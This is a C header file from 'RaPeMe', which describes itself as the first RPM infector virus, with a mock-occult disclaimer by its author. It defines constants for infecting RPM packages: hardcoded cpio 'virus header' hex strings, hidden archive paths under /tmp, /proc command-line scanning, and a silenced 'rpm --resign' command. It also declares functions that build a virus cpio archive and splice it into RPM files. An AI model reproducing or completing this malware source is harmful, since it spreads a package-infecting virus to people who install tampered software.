/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : intestinal.cancer@hotmail.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon,that is to say your karma will
		be affected negatively by your acts.
========== */



#define PROC_DIR_TAG					"/proc/"
#define PROC_CMD_TAG					"/cmdline"
#define LAST_TMP					"/tmp/.ultimate.cpio"
#define LAST_TMP_GZ					"/tmp/.ultimate.cpio.gz"
#define GZIP_ARCHIVE					"gzip /tmp/.ultimate.cpio"
#define CPIO_VIRUS_HEADER_1				"0707010185892b000081ed0000000000000000000000013f8d7ebd"
#define CPIO_VIRUS_HEADER_2				"00000003000000060000000000000000000000"
#define CPIO_HEADER_SIZE				110	
#define DAMN_IT						4	
#define TMP_DIR_TAG					"/tmp/"
#define RPM_RESIGN					"rpm --resign "
#define DEV_NULL_OUT					" >/dev/null" 

FILE *prepare_virus_cpio(FILE *cpio,char *cpio_first_file_name,int cpio_first_file_name_len,
			unsigned long cpio_first_file_size);

void magick_ritual(FILE *rpm,FILE *arch,char *r_name,unsigned long rpm_offset);
	


